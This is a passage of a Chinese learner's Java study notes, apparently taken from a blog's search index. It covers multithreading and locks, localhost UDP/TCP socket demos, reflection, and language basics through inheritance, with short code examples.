getName(); 线程调度规则 分时调度（平均分配） 抢占式调度（按照优先级） 优先级高的被执行的几率更高 设置优先级1234//获取thread.getPriority();//设置thread.setPriority(); 获取当前线程1Thread.currentThread(); 休眠1thread.sleep(1000); 加入主线程重新回归主线程的那条线，从上到下执行代码 1thread.join(); 守护线程顾名思义，若没有了其他线程，守护线程也会消失（不管有没有执行完代码） 守护线程的代码必须在启动代码前 12thread.setDaemon();thread.start(); 中断线程1234//直接击毙thread.stop();//改变标志,线程根据这个标志主动处理中断thread.interrupt(); 线程的生命周期 缺点 因为单继承，所以他无法继承别的类了 implements Runnable这个接口里面只有一个抽象方法run，继承它必须实现这个方法 12345678910111213141516171819202122232425262728package com.manu.student01;import org.junit.Test;public class MyRunnable implements Runnable { @Override public void run() { Thread t = Thread.currentThread(); for(int i=0; i&lt;100; i++) { System.out.println(t.getName()+&quot;-&quot;+i); } }}//测试方法 public void testRunnable() { MyRunnable r = new MyRunnable(); Thread t1 = new Thread(r); Thread t2 = new Thread(r,&quot;thread-2&quot;); t1.start(); t2.start(); }} 特点 是一个接口，单继承多实现，可以继承别的类 线程之间数据共享，如上r，t1,t2实际上都会调用同一个对象的run方法 匿名内部类线程1234567891011121314Runnable r = new Runnable() { @Override public void run() { for(int i=0; i&lt;100; i++) { System.out.println(Thread.currentThread().getName()+&quot;:&quot;+i); } }};// Thread t = new Thread(r,&quot;InnerClassThrad&quot;);// t.start();new Thread(r,&quot;InnerClassThrad&quot;).start(); 123456789new Thread() { @Override public void run() { for(int i=0; i&lt;100; i++) { System.out.println(Thread.currentThread().getName()+&quot;:&quot;+i); } }}.start(); 线程安全发现问题先举一个售票的例子 四个售票场所共有100张票，使用多线程解决卖票 继承重写run方法类 12345678910111213141516171819202122232425262728package com.manu.student01;import org.junit.Test;public class TicketThread extends Thread { private static int count = 100; public TicketThread() {} public TicketThread(String name) { super(name); } @Override public void run() { while(true) { if(count&gt;0) { System.out.println(Thread.currentThread().getName()+&quot;卖出了第&quot;+count+&quot;票&quot;); count--; }else { break; } } }} 创建四个线程 123456789101112131415161718package com.manu.student01;import org.junit.Test;public class Prctice { @Test public void test() { TicketThread t1 = new TicketThread(&quot;售票点1&quot;); TicketThread t2 = new TicketThread(&quot;售票点2&quot;); TicketThread t3 = new TicketThread(&quot;售票点3&quot;); TicketThread t4 = new TicketThread(&quot;售票点4&quot;); t1.start(); t2.start(); t3.start(); t4.start(); }} 结果（多运行几次就会这样） 123售票点1卖出了第100票售票点2卖出了第100票.... 原因：多线程就是每个线程都在抢代码运行，以上面的例子，线程1在抢到输出后，count没有自减，然后线程2抢到了输出（此时count还是100），这就是线程不安全问题 解决方法思想就是将代码上锁，将你需要执行的代码上“锁”，比如在执行2-3行代码时，先将这2-3行代码上锁，钥匙由线程来抢，这时其他线程没有钥匙，无法执行这2-3行代码，当抢得钥匙的线程执行完后将钥匙归还，这时再由线程抢钥匙来执行，这样就保证了线程安全，但在执行期间其他线程在等待就造成了效率问题 代码部分 继承Thread 1234567891011121314151617181920212223242526272829303132333435363738package com.manu.student01;import org.junit.Test;public class TicketThread extends Thread { private static int count = 100; private static Object lock = new Object(); //对象不一样，锁必须一样 public TicketThread() {} public TicketThread(String name) { super(name); } @Override public void run() { while(true) { synchronized (lock) { if(count&gt;0) { System.out.println(Thread.currentThread().getName()+&quot;卖出了第&quot;+count+&quot;票&quot;); count--; }else { break; } } //加入延时使售票点更加随机 try { Thread.sleep(100); } catch (Exception e) { e.printStackTrace(); } } }} 实现Runnable 123456789101112131415161718192021222324252627282930package com.manu.student01;public class TicketRunnable implements Runnable { private int count = 100; @Override public void run() { while(true) { synchronized (this) { //this代表当前对象，对象一样锁也一样 if(count&gt;0) { System.out.println(Thread.currentThread().getName()+&quot;卖出了第&quot;+count+&quot;票&quot;); count--; }else { break; } } try { Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } } }} synchronized可以设置一个sycnhronized方法，将同步代码放在这个方法里面 123public synchronized void test(){ //代码} ReentrantLock第二种锁 使用方法 创建对象 ReentrantLock lock = new ReentrantLock(); 加锁 lock.lock 解锁 lock.unlock 为了防止加锁的代码异常无法解锁，通常要使用try finally 当有两个线程类访问同一数据时，可以在构造时传递一把锁，这样不同的类就能使用同一把锁了 死锁一个门两把锁，线程1拿了一把锁，线程2拿了一把锁，最终导致谁都打不开门 线程组将线程进行统一管理 如 12345678910111213141516package com.manu.student01;public class MyThreadGroup { public static void main(String[] args) { ThreadGroup tg = new ThreadGroup(&quot;线程组&quot;); MyRunnable r = new MyRunnable(); Thread t1 = new Thread(tg, r); Thread t2 = new Thread(tg, r); Thread t3 = new Thread(tg, r); Thread t4 = new Thread(tg, r); tg.setDaemon(true); }} 定时器12345678910111213141516171819202122package com.manu.student01;import java.util.Timer;import java.util.TimerTask;public class TestTimer { public static void main(String[] args) { //定时器对象 Timer t = new Timer(); //安排 t.schedule(new MyTimerTask(), 2000, 1000); }}//创建一个定时任务类class MyTimerTask extends TimerTask { @Override public void run() { System.out.println(&quot;这是一个定时任务&quot;); }}","link":"/Programming/Java/day12_%E5%A4%9A%E7%BA%BF%E7%A8%8B.html"},{"title":"网络编程","text":"使用套接字进行编程 ip与port ip可以访问我们的设备 端口可以访问到设备里的程序 通信协议UDP 通信快 不需要建立连接 不可靠 TCP 通信慢 三次握手建立连接 可靠 UDP就像发短信，TCP就像打电话是 Socket套接字在程序中使用Socket进行通信，用来指定IP,port，协议 数据发送的两步： 监听：等待数据发送过来，需要指定监听的端口 发送：指定发送到哪台计算机，哪个端口 socket分为接受端（服务器）和发送端（客户） UDP发送端123456789101112131415161718192021222324package com.manu.student02;import java.net.DatagramPacket;import java.net.DatagramSocket;import java.net.InetAddress;import java.net.SocketException;public class UDP_Send { public static void main(String[] args) throws Exception { DatagramSocket ds = new DatagramSocket(); InetAddress address = InetAddress.getByName(&quot;localhost&quot;); //指定接受端的端口 int port = 9001; byte[] buf = &quot;测试&quot;.getBytes(); int length = buf.length; //数据打包 DatagramPacket p = new DatagramPacket(buf, length, address, port); ds.send(p); ds.close(); }} 接受端123456789101112131415161718192021package com.manu.student02;import java.net.DatagramPacket;import java.net.DatagramSocket;public class UDP_Receive { public static void main(String[] args) throws Exception { //设置监听端口 DatagramSocket ds = new DatagramSocket(9001); byte[] buf = new byte[1024]; int length = buf.length; DatagramPacket p = new DatagramPacket(buf, length); ds.receive(p); System.out.println(new String(p.getData(),0,length)); ds.close(); }} Linux的端口在1024以内需要root才能执行，或者关闭SELinux 发送端的端口号是系统自动分配的 循环接受123456789101112131415161718192021222324252627package com.manu.student02;import java.net.DatagramPacket;import java.net.DatagramSocket;import java.net.InetAddress;public class UDP_Receive { public static void main(String[] args) throws Exception { DatagramSocket ds = new DatagramSocket(9001); while(true) { byte[] buf = new byte[1024]; int length = buf.length; DatagramPacket dp = new DatagramPacket(buf, length); ds.receive(dp); InetAddress address = dp.getAddress(); String str = new String(dp.getData(),0,length); System.out.println(address+&quot;:&quot;+str); } // ds.close(); }} 循环发送12345678910111213141516171819202122232425262728package com.manu.student02;import java.net.DatagramPacket;import java.net.DatagramSocket;import java.net.InetAddress;import java.net.SocketException;import java.util.Scanner;public class UDP_Send { public static void main(String[] args) throws Exception { DatagramSocket ds = new DatagramSocket(); InetAddress address = InetAddress.getByName(&quot;localhost&quot;); int port = 9001; while(true) { Scanner s = new Scanner(System.in); String str = s.nextLine(); if(str.equals(&quot;end&quot;))break; byte[] buf = str.getBytes(); int length = buf.length; DatagramPacket p = new DatagramPacket(buf, length, address, port); ds.send(p); } ds.close(); }} TCP举一个双向聊天例子好了 发送端（client）1234567891011121314151617181920212223242526272829303132333435363738394041package com.manu.student02;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.net.Socket;import java.util.Scanner;public class TCP_Send { public static void main(String[] args) throws Exception { //建立连接 Socket ts = new Socket(&quot;localhost&quot;,9001); OutputStream out = ts.getOutputStream(); InputStream in = ts.getInputStream(); Scanner s = new Scanner(System.in); byte[] buf = new byte[1024]; new Thread() { public void run() { int length = -1; try { while((length = in.read(buf))!=-1) { String s = new String(buf, 0, length); System.out.println(s); } } catch (Exception e) { e.printStackTrace(); } }; }.start(); while(true) { String str = s.nextLine(); if(str.equals(&quot;end&quot;))break; out.write(str.getBytes()); } ts.close(); }} 接收端（server）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package com.manu.student02;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.net.ServerSocket;import java.net.Socket;import java.util.Scanner;public class TCP_Receive { public static void main(String[] args) throws Exception { ServerSocket ss = new ServerSocket(9001); //接受并建立发送端的连接 Socket client = ss.accept(); System.out.println(&quot;连接成功&quot;); Scanner s = new Scanner(System.in); InputStream input = client.getInputStream(); OutputStream output = client.getOutputStream(); byte[] buf = new byte[1024]; new Thread() { public void run() { while(true) { try { String str = s.nextLine(); if(str.equals(&quot;end&quot;))break; output.write(str.getBytes()); } catch (Exception e) { e.printStackTrace(); } } }; }.start(); int length = -1; while((length = input.read(buf))!=-1) { String str = new String(buf, 0, length); System.out.println(s); } client.close(); ss.close(); }} TCP的客户端可以有多个，服务端只能有一个（需要循环监听端口），在循环监听端口时监听到一个端口就可以启动客户端线程操作","link":"/Programming/Java/day13_%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B.html"},{"title":"类的加载和反射","text":"对于我来说就是不停机加载类 类的加载 当程序运行的时候，系统会首先把要使用的Java类加载到内存中，加载的是编译后的class文件 每个类加载到内存中，会创建一个对应的Class对像，这个对象保存了这个类有哪些成员（数据，方法） 我们的程序用到什么类，才会加载什么类 类的加载器作用：将.class文件加载到内存中，生成对应的java.lang.Class对象 反射功能：在程序运行的时候，需要动态的加载一些类这些类可能之前用不到所以不用加载到JVM，而不用停止程序，重新加载程序 ok，介绍完毕，代码部分 测试的类 12345678910111213141516171819202122232425262728293031323334353637package com.manu;public class Student { private String name; private int id; private int age; public int score; public Student (){} public Student(String name, int id, int age) { this.name = name; this.id = id; this.age = age; } public Student(String name, int id, int age,int score) { this.name = name; this.id = id; this.age = age; this.score = score; } private Student (int age) { this.age = age; } public void learn() { System.out.println(&quot;学习&quot;); } public void learn(String course) { System.out.println(&quot;学习&quot;+course); } public void show() { System.out.println(name+&quot;:&quot;+id+&quot;:&quot;+age); } private void eat(String food) { System.out.println(&quot;正在吃&quot;+food); }} 获取Class对象每个类只有与之对应的唯一的Class对象 123456789101112131415package com.manu;public class GetClass { public static void main(String[] args) throws Exception { //获取class对象 //1.通过对象获得 Student s = new Student(); Class c = s.getClass(); //2.通过类获得（不常用） Class c2 = Student.class; //3.Class的静态方法 Class.forName(&quot;com.manu.Student&quot;); }} 获取构造方法123456789101112131415161718192021222324252627282930313233package com.manu;import java.lang.reflect.Constructor;public class GetConstructor { public static void main(String[] args) throws Exception { Class c = Class.forName(&quot;com.manu.Student&quot;); //获得所有public构造方法 Constructor[] cs = c.getConstructors(); //获得指定构造方法,没有参数代表无参构造方法// Constructor cs2 = c.getConstructor(); Constructor cs2 = c.getConstructor(String.class,int.class,int.class); //调用构造方法 Object o = cs2.newInstance(&quot;manu&quot;,100,19); Student s = (Student)o; s.show(); //忽略权限得到构造方法 Constructor[] cs3 = c.getDeclaredConstructors(); Constructor cs4 = c.getDeclaredConstructor(int.class); //使用private的构造方法 cs4.setAccessible(true); Object o2 = cs4.newInstance(19); Student s2 = (Student)o2; s2.show(); }} 获取字段1234567891011121314151617181920212223242526272829package com.manu;import java.lang.reflect.Field;public class GetField { public static void main(String[] args) throws Exception { //因为获取字段需要对象，这里new一个对象 Student stu = new Student(&quot;manu&quot;,9001,19); Class c = Class.forName(&quot;com.manu.Student&quot;); //得到所有public字段（成员变量） Field[] fields = c.getFields(); //指定字段名字，public Field field = c.getField(&quot;score&quot;); //反射形式访问字段 System.out.println(field.get(stu)); //得到所有字段（忽略权限） Field[] fields2 = c.getDeclaredFields(); //指定字段名字（忽略权限） Field field2 = c.getDeclaredField(&quot;age&quot;); //反射形式访问字段 field2.setAccessible(true); System.out.println(field2.get(stu)); }} 获取成员方法12345678910111213141516171819202122232425262728package com.manu;import java.lang.reflect.Method;public class GetMethod { public static void main(String[] args) throws Exception { Student stu = new Student(&quot;manu&quot;,9001,19); Class c = Class.forName(&quot;com.manu.Student&quot;); //得到所有public方法，包括继承父类 Method[] method = c.getMethods(); //指定方法名,public, Method m = c.getMethod(&quot;learn&quot;); m.invoke(stu); //加上参数 Method m2 = c.getMethod(&quot;learn&quot;,String.class); m2.invoke(stu, &quot;Java&quot;); //得到自身的所有方法，包括private Method[] m3 = c.getDeclaredMethods(); //调用private方法 Method m4 = c.getDeclaredMethod(&quot;eat&quot;, String.class); m4.setAccessible(true); m4.invoke(stu, &quot;垃圾&quot;); }}","link":"/Programming/Java/day14_%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%8F%8D%E5%B0%84.html"},{"title":"Java基础","text":"Java是一门面向对象编 程语言，具有简单性、面向对象、分布式、健壮性、安全性、平台独立与可移植性、多线程、动态性等特点 。Java可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统应用程序等 。 跨平台开发出来的项目可以在各个操作系统上执行，而不需要针对操作系统单独开发，原因就是Java有一个解释器，JVM(Java Virtual Machine) 运行原理.java编译出字节码程序.class，通过JVM在操作系统上运行，所以每个操作系统有不同的JVM JDK和JREJRE(Java Runtime Environment)也就是java运行环境，JDK(Java Development Kit)也就是Java开发工具包，jdk里面有jre，百度下载安装就可以开始编程了 环境变量配置JDK安装后，路径下u有个bin，javac、java等编译运行指令都在这个目录，如果不想每次编译都输入很长的命令就把它设置到环境变量吧，win10找到path添加绝对路径，linux可以在/etc/profile、/.bashrc、\\/.bash_profile里面添加PATH=&quot;${PATH}:你jdk的bin存放的绝对路径&quot;，重新打开一个shell就有了 注意新增一个变量classpath，设置路径后，就可以在任意地方运行你的java程序了 Java标识符1.由字母，数字，_$组成 2.不能以数字开头 3.不能是Java关键字 4.区分大小写 5.最好遵循陀峰命名法 类名首字母大写，其他首字母小写 6.不能有空格 java语言类型基本数据类型(Primitive Type)1.数值类型 整数类型 byte:占1字节 short:占2字节 int:占4字节 long:占8字节 浮点类型 double：8字节 float：4字节 字符类型 chat：2字节 2.boolean类型 占1位，只有false和true两个值 需要特别注意的就是整数默认是int型，浮点数默认是double型，赋给其他类型时记得手动转换类型，不然编译会报错 但是short和byte如果在数据范围内的话不会报错，而且也不用手动转换类型 示例 123456789101112131415public class DataType{ public static void main(String[] args){ byte a = 1000; long b = 10000l; float c = 1.3f; double d = 5.3; System.out.println(a); System.out.println(b); System.out.println(c); System.out.println(d); }} 引用数据类型(Reference Type)1.类 2.接口 3.数组 需要注意的是字符串类型也是一个类，也属于引用数据类型 变量与常量 定义变量格式 数据类型 变量名 = value 定义常量格式 final 数据类型 常量名 = value 总结 定义long和float时，数字末尾加上l和f，大小写随意 char可以存储汉字，因为他占2字节，汉字也占两个字节 正数采用二进制源码存储 负数采用补码存储 算术运算符1.符号：* / + - % 2.规则：操作数1 运算符 操作数2 运算的特例 使用浮点数时，数据不会精确 使用+可以对字符串进行组拼 hello&quot;+&quot;world&quot; ==&gt; &quot;helloworld&quot; &quot;44&quot;+44 ==&gt; &quot;4444&quot; &quot;hello&quot;+44 ==&gt; &quot;hello44&quot; &quot;hello&quot;+'a' ==&gt; &quot;helloa&quot; 使用单个字符时，会把字符转换成数字在进行运算 赋值运算符符号：= += -= *= /= %= 比较运算符符号：&lt; &gt; &lt;= &gt;= == != 返回结果：boolean值true或false 逻辑运算符符号： ||短路或：也就是说boolean1为true，则boolean2不用算直接得结果 &amp;&amp;短路与 ！ ^异或：结果不一样返回true &amp;与：不管boolean1的true和false，boolean2也会计算 |或 规则：boolean1 逻辑运算符 boolean2 注意：1&lt;=x&lt;=2是错误的写法 按位 &amp;按位与 |按位或 ~ ^按位异或 移位 &gt;&gt;右移，高位用符号位填充 &lt;&lt;左移，低位0填充 &gt;&gt;&gt;无符号右移，高位0填充，低位丢弃 三元运算规则：布尔表达式?表达式1:表达式2 true使用表达式1 false使用表达式2 表达式不能是赋值语句 示例 12345public class TernaryOpretor{ public static void main(String[] args){ System.out.println(8&gt;9?&quot;正确&quot;:&quot;错误&quot;); }} 类型转换隐式类型转换数值在赋值和运算时会自动转换类型 123byte a=100;float b;b = a; a就会变为float型 显式类型转换自己转换类型 12float a = 100;byte b = (byte)a; 如果不转换类型的话会报错","link":"/Programming/Java/day1_%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.html"},{"title":"条件判断和字符串","text":"分支、循环与字符串相关的一些操作 条件判断1.if语句语法： 1234567891011//形式1if (布尔表达式) {}//形式3(else if数量不限，else可有可无)if (布尔表达式) { } else if (布尔表达式) { } else { } 2.switch语句1234567891011switch(表达式){ case value1: 语句块; break; case value2: 语句块; break; default: 语句块; break;} 表达式可以是整数，字符，枚举，字符串 case后面必须是常量 break用来中断语句 循环1.while循环语法 123while(布尔表达式){ 循环体;} 满足条件运行循环体 2.do while循环语法 123do{ 循环体;}while(表达式) 3.for循环语法 12345678//1for(初始化语句;条件判断语句;更新语句){ 循环体;}//2for (循环变量类型 循环变量名称 : 要被遍历的对象) { 循环体 } 条件判断语句不写默认true break continue break跳出当前循环 continue中断当前循环，进入下一次循环 break的其他用法 自定义标签，跳出标签所在循环 比如 1234567outside:while(){ inside: for(){ break outside; }} 字符串常量在&quot;&quot;里面的就是字符串常量 变量定义一个字符串变量需要引用一个新的类String 有两种定义模式 1.String str = &quot;HelloWorld!&quot;; 2.String str2 = new String(&quot;HelloWorld!&quot;); 连接通过+可以对字符串（或其他数据类型）常量和变量作连接操作 特性 字符串是无法被修改的 基本数据类型都在栈区，栈容量比较小 引用数据类型在栈存放地址，数据存放在方法常量区，地址指向数据 如图 基本数据类型变量改变时会直接覆盖原始数据 引用数据类型的原始数据不会被删除，改变时会创建新的数据，并改变地址指向 信息获取也就是针对字符串的一些操作 长度s.length() s代表字符变量 示例 12String str = &quot;Hello World!&quot;;System.out.println(str.length()); 结果就是12 查找子字符串的位置查找字符会从0开始索引 1.s.indexOf(int c); 传递一个数字或字符，返回字符的索引 2.s.indexOf(String str); 传递一段字符串，返回第一个字符的索引，不存在返回-1 3.s.lastIndexOf(String str); 从字符串末尾开始查找，返回第一个字符的索引 获取指定索引的字符s.charAt(int index); 获取指定字符串s.substring(int beginindex); 得到索引以后的字符 s.substring(int beginindex,int endindex); 得到索引范围内的字符 判断判断的返回值是布尔值 开头字符s.startWith(String prefix); 结尾字符s.endWith(String suffix); &quot;&quot;虽然也返回true，但没有意义 相等1.== 功能：可以判断数据引用是否相同 规则：str1==str2 特例 123String str1 = &quot;Hello World!&quot;;String str2 = new String(&quot;Hello World!&quot;);System.out.println(str1==str2); 结果是false 为什么？ 看图： 2.s.equals(String str); 功能：直接查看字符是否相同 示例： 123String str1 = &quot;Hello World!&quot;;String str2 = new String(&quot;Hello World!&quot;);System.out.println(str1.equals(str2)); 3.s.equalsIgnoreCase(String str); 功能：忽略大小写 4.s.compareTo(String str); 功能：比较字符串的大小，通过索引一个一个字符的比较，相同则跳过，遇到不同则返回差值，若s与str前面几个字符相同后面不同则返回字符串长度的差值 含某子字符串s.contains(String str) 空字符串s.isEmpty 空的状态 12String s1 = &quot;&quot;; //空指针String s2 = null; //空对象 转换操作操作都不会改变原有字符串，会创建新的字符串 大小写s.toLowerCase(String str) s.toUpperCase(String str) 除去首尾空格s.trim(String str) 替换s.replace(old str,new str)","link":"/Programming/Java/day2_%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2.html"},{"title":"数组","text":"介绍了数组和栈堆相关的概念 引用数据类型和基本数据类型在创建的区别 基本数据类型只要声明了，就会被赋予内存，不管有没有赋值 引用数据类型创建分两步，声明和初始化 声明只在栈里面分配内存，用来存储引用（地址） 初始化在堆里或方法区里分配内存，创建实际数据 new在堆里 程序运行常量放在方法区里 栈所有局部变量都在栈里 一维数组声明有两种声明方法，我使用int类型举例 1.int[] ArrayName 2.int ArraryName[] 注意：没初始化的数组无法使用 初始化初始化才能使用数组，三种方式 123456//初始化使用默认值(基本数据类型0,false，引用数据类型null)int[] ArrayName = new int[3];//根据元素个数int[] ArrayName = new int[]{1,2,2};//和上面差不多int[] ArrayName = {1,2,2}; 使用数组ArrayName[索引] 索引从0开始，可以对元素进行赋值和使用 使用时需要注意： 索引不能超出范围 引用空数组 填充数组： 123import java.util.Arrays;//使用Arrays.fill(ArrayName,value); 二维数组1.声明 数据类型[][] ArrayName 数据类型 ArrayName[][] 2.初始化12345678//数据类型[][] 数组名=new 数据类型[m][n];//使用默认值//数据类型 数组名[][]={{a,b},{c,d}};//int[][] arrayName = new int[10][];//默认值null//赋值arrayName[0] = new int[]{a,b,c}; 3.使用arrayName[索引][索引] 举一个遍历二维数组的例子 1234567int[][] a = {{1,2,3,4,5},{0,9,8,7,6}};for(int i=0;i&lt;a.length;i++){ for(int j=0;j&lt;a[i].length;j++){ System.out.print(a[i][j]+&quot; &quot;); }}","link":"/Programming/Java/day3_%E6%95%B0%E7%BB%84.html"},{"title":"方法","text":"方法就像C语言的函数，用来简化代码用的 定义格式123修饰符(如public static) 返回值类型 方法名(参数){ 方法体;} 返回值 如果类型为void可以不需要返回值 通过return可以有一个返回值，要与返回值类型相同 参数 基本数据类型只传值(不会破坏元数据) 引用数据类型是传引用(破坏原数据) 当我们需要的参数不确定，或则很多时，方法重载就不适用了，可变参数有两种形式 可变参数123456789101112131415package com.manu.parameter;public class KeBian { public static void main(String[] args) { System.out.println(add(23,23,23,45)); } public static int add(int... args) { int result=0; for(int i : args) { result += i; } return result; }} 数组参数123456789101112131415package com.manu.parameter;public class Arrays { public static void main(String[] args) { System.out.println(add(new int[]{23,34,34})); } public static int add(int[] args) { int result=0; for(int i : args) { result += i; } return result; }} 注意 可变参数的是个数可变 在调用方法时，如果可变参数方法和固定参数方法重复的话，优先固定参数 一个方法只能有一个可变参数，而且放在最后 (int a, String... s) 单元测试Junit在写大型程序时，肯定是写一些代码测试一些代码，不可能再把所有代码运行一遍 在eclipse里面添加Junit库后在方法前面添加注解@Test即可进行单元测试 添加方法：eclipse的Project Explorer右键–&gt;Build Path–&gt;Configure Path–&gt;Java Build Path–&gt;Libraries–&gt;Moudlespath–&gt;add Library–&gt;classpath–&gt;Junit 方法重载(reload)也就是方法名可以一样，但参数不能一样 判断方法是否重复要看方法名+参数，两者一样才算重复 比如 123456789public static void Method(){ System.out.println(&quot;Hello&quot;);}public static void Method(int a){ System.out.println(&quot;Hello&quot;);}public static void Method(int a,int b){ System.out.println(&quot;Hello&quot;);} 程序健壮不容易崩溃的程序才叫健壮 一般需要加上很多判断条件才能让程序不容易崩溃 枚举功能：通常1,2,3,4标识代码里面的角色时，但就这样的话代码变得难读，而枚举就是为了增加代码可读性 示例1234567891011121314151617package com.manu.student03;public class TestEnum { public static void main(String[] args) { int a = Season.AUTUMN; int b = Season.SPRINT; }}//使用单独的一个类来管理季节class Season { public static final int SPRINT = 0; public static final int SUMMER = 1; public static final int AUTUMN = 2; public static final int WINTER = 3;} 类型相当与上面的简化 12345package com.manu.student03;public enum Season { SPRING,SUMMER,AUTUMN,WINTER} 123456789package com.manu.student03;public class Demo_Enum { public static void main(String[] args) { System.out.println(Season.AUTUMN); System.out.println(Season.AUTUMN.ordinal()); }} 遍历 123for(Season s : Season.values()) { System.out.println(s);} toString() 所有类都继承java.lang.Object 它有一个toString()方法可以显示内存地址 利用eclipse可以重写toString()方法（显示所有成员） 比较 ==比较的是引用 equals比较的是数据 有时候还是要重写equals进行对象之间的比较 jar库 就是一个压缩包，里面包含类 用户也可以生成jar包 Scanner hasNextxxx可以用来判断输入的是不是xxx类型的 StringBuff 相对与String字符占多少申请多少空间，String是直接申请很多空间 String虽然也可以通过+将字符组拼，但那会重新申请内存，将字符“搬”到里面去，比较费时间 StringBuff有一个默认的容量，他会根据你的字符进行扩容，扩容时改变指向，容量通常X2 StringBuilder 基本和StringBruff相同 不同 StringBuilder线程不安全，性能略高 StringBuff线程安全，性能相对低 字符串在JDK9之前使用char（2字节）存储，JDK9使用byte存储","link":"/Programming/Java/day4_%E6%96%B9%E6%B3%95.html"},{"title":"理解类和对象","text":"类就是一个模板，将模板实例就是对象 类class类里面有成员变量和成员方法 定义例子(public class只能有一个) 1234567class 类名{ 成员变量; public void practice(){ 方法体; }} 特点成员变量可以不初始化 自动默认值 对象通过类创建的变量就叫对象 声明+初始化1类名 对象=new 类名(); new相当于初始化 new才会分配内存空间（堆），然后进行初始化数据 对象.成员变量/方法可以访问类的变量和方法 使用除了一般使用对象还可以作为成员变量存在于另一个类里面 面向对象和面向过程 面向过程就像做事一步一步完成(C) 面向对象就像操作不同的职位进行管理(Java,c#…) 面向对象可以让程序更加有条理性，是更好的程序表达 成员变量和局部变量 成员变量 局部变量 定义在类里面 定义在方法里面 只有在new(自动初始化)时才占用内存 调用方法才占用空间 数据在堆里面 数据在栈里面 通过GC回收 方法调用完即释放内存 GC垃圾回收(Garbage Collection)是Java虚拟机(JVM)垃圾回收器提供的一种用于在空闲时间不定时回收无任何对象引用的对象占据的内存空间的一种机制 参考 匿名对象直接使用new出的对象就叫匿名对象，通常只调用一次时才会使用匿名对象 如new 类名(); 可以作为参数使用 如new ClassName1().method(new ClassName2()); 匿名对象不会在栈分配空间，而是直接在堆里分配空间，所以调用完毕会立马被GC回收 而有名字的对象由于在栈里有空间，所以要等方法调用完才会被清理，当它调用一个匿名对象时，匿名对象也会存活久一些 修饰符public和private用法 在类里使用public和private修饰成员变量和成员方法 123456class Hello{ private int test; private Test(){ int a; }} public代表公开，允许其他类使用 private代表私有，不允许其他类使用 功能 提高容错率 也就是让程序更加健壮 构造方法功能：方便初始化 说明：当我们new一个新对象时，系统会根据类型自动初始化（默认的构造方法），而我们想要初始化成自己的数据时就不得不使用对象名.成员=value来初始化，于是我们可以自定义构造方法来进行初始化 操作： 12345678910111213141516class Test{ int a; String b; //无参初始化 public Test(){ //初始化操作 } //有参初始化，参数不同，方法不同 public Test(int _a,String _b){ a=_a; b=_b; }}//此时有了两种构造方法Test a = new Test();Test a = new Test(13,14); 一般修饰符是public 单例模式用到private this功能：代表当前对象，实用上就是方便见名知意 1234567891011121314class Test{ int a; String b; public Test(){ //初始化操作 } //此时重名就不会有影响 public Test(int a,String b){ this.a=a; //成员 参数 this.b=b; } //还可以this.方法} 封装是一种编程思想，让程序更加安全 做法 将类的成员变量全部设置为private，不让外界直接接触 若要查看某成员，提供get方法 若要编辑，提供set方法(慎用) static修饰 可以修饰成员变量和成员方法 通过成员和类都可以调用，调用的是同一串数据 修饰成员变量表示静态变量，静态变量是所有对象共有的，只占一份空间 修饰成员方法表示静态方法，静态方法只能访问静态变量/方法，访问非静态变量时会不知道对象，传递一个对象参数才能访问成员变量 例子123456789101112131415161718class Person{ public int age; public static String country; public Person(int age,String country){ this.age = age; this.country = country; }}class StaticDemo{ public static void main(String[] args){ Person a = new Person(13,&quot;China&quot;); Person b = new Person(15,&quot;America&quot;); System.out.println(a.age+&quot;-&quot;+a.country); System.out.println(b.age+&quot;-&quot;+b.country); //使用“类名.静态变量”也可以访问 }} 运行结果 123[manu@MY day5 07:33 下午]$ java StaticDemo 13-America15-America 解释原理图 结论 当多个对象使用同一个一模一样的成员时，使用静态变量可以节约内存空间 非静态成员可以访问静态成员 特点1.随着类的加载而加载 2.优先于对象，也就是说并不需要创建对象才能使用 3.所有对象共享，可以通过对象或者类进行访问 实际运用 在创建工具类时可以使用static，这样就不需要再创建对象了 在编写工具类时，推荐将构造方法私有化，防止别人使用麻烦的代码（创建对象等） 静态代码块123static{} 功能：在加载class时先加载一次静态代码块里面的东西，以后就不会加载了","link":"/Programming/Java/day5_%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1.html"},{"title":"理解继承","text":"使类与类之间有一定的联系 继承功能使一个类（子类）具有另一个类（父类）的功能 优点当不同的类使用相同的成员变量/方法时，可以将相同的变量/方法放在其他类，简化代码，方便维护 例子(定义+使用) 12345678910111213141516171819202122232425262728293031323334353637383940414243 1 //定义一个人的类，有年龄名字，和吃饭的行为 2 class Person{ 3 private int age; 4 private String name; 5 public void eat(){ 6 System.out.println(&quot;吃饭&quot;); 7 } 8 public int getAge(){ 9 return age;10 }11 public void setAge(int age){12 this.age = age;13 }14 public String getName(){15 return name;16 }17 public void setName(String name){18 this.name = name;19 }20 }21 //定义一个学生，继承人，他本身有小名，学习的行为22 class Student extends Person{23 private String childboodName;24 public void learn(){25 System.out.println(&quot;学习&quot;);26 }27 public String getChildboodName(){28 return childboodName;29 }30 public void setChildboodName(String childboodName){31 this.childboodName = childboodName;32 }33 }34 //使用35 public class ExtendsDemo{36 public static void main(String[] args){37 Student a = new Student();38 a.setAge(18);39 a.setName(&quot;明明&quot;);40 a.setChildboodName(&quot;小明&quot;);41 System.out.println(a.getName()+&quot;-&quot;+a.getAge()+&quot;-&quot;+a.getChildboodName());42 }43 } 构造方法 在子类的构造方法里面使用super()可以调用父类里面的构造方法 super()必须写在子类构造方法的第一句 实际上super还可以调用成员，如果成员公开 注意事项 不支持多继承，即一个类只能继承一个类（关系纯洁??） 子类继承了父类的成员 子类不能访问父类的私有成员 子类拥有父类的私有成员，不能直接访问 “是一个”关系，比如学生是人，不能说人是学生 当子类和父类有重名变量时，谁近就访问谁，通过this，super可指定具体的变量 通过子类的构造方法构造对象时，都会调用父类的构造方法 对父类进行初始化，不指定则调用默认的构造方法 如果设置了有参构造方法时，系统默认的无参构造方法就没有了 